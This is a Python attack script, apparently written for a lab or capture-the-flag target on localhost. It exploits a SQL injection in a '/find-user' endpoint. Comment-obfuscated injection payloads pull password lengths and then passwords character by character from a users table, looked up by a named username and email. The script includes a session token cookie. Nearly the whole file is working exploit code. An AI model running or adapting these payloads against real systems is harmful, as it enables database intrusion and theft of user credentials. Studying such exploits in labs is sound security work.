import requests
import re

# Configuration (change to your lab URL)
url = "http://localhost:8080/find-user"
cookies = {"auth": "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJIYWNrIiwiaWF0IjoxNzY1Njc0MDYxLCJleHAiOjE3NjU2ODI3MDF9.OyRjRknPbV4WbvP4EzYWVWgn-IKQ9XRkYd2fDtVTJW2lpredmRLLUyO1IRkt5y7EvM7BZafdXaLY6qFZManL9w"}
username = "itsmaria"
email = "Amy.Mcwilliams@proton.me"

# Function to check if injection returns a profile (true condition)
def query(payload):
    params = {"u": f"XXX'{payload}"}
    response = requests.get(url, params=params, cookies=cookies)
    # Parse the profile ID from href="/profile/XX"
    match = re.search(r'style="text-decoration:none; color: white" href="/profile/(\d+)"', response.text)
    if match:
        return int(match.group(1))  # Returns the ID if profile found
    return None

# Step 1: Find password length using binary search
def extract_length(payload):
    return query(payload)

# Step 2: Extract password char by char
def extract_data(length, payload):
    password = ""
    payloads = [payload.replace("pos", str(pos)) for pos in range(1, length + 1)]
    for payload in payloads:
        if query(payload) is not None:
            char_code = query(payload)
            char = chr(char_code)
            password += char
        print(f"Position: {char} -> {password}")
    return password

# Get password length and data by username
password_len_payload = f"/**/OR/**/id=(SELECT/**/LENGTH(password)/**/FROM/**/users/**/WHERE/**/username=$${username}$$/**/LIMIT/**/1)--"
password_data_payload = f"/**/OR/**/id=(SELECT/**/ASCII(SUBSTRING(password,pos,1))/**/FROM/**/users/**/WHERE/**/username=$${username}$$)--"
password_length = extract_length(password_len_payload)
print(f"password length: {password_length}")
if password_length:
    extract_data(password_length, password_data_payload)

# Get password length and data by email
password_len_payload = f"/**/OR/**/id=(SELECT/**/LENGTH(password)/**/FROM/**/users/**/WHERE/**/email=$${email}$$/**/LIMIT/**/1)--"
password_data_payload = f"/**/OR/**/id=(SELECT/**/ASCII(SUBSTRING(password,pos,1))/**/FROM/**/users/**/WHERE/**/email=$${email}$$)--"
password_length = extract_length(password_len_payload)
print(f"password length: {password_length}")
if password_length:
    extract_data(password_length, password_data_payload)
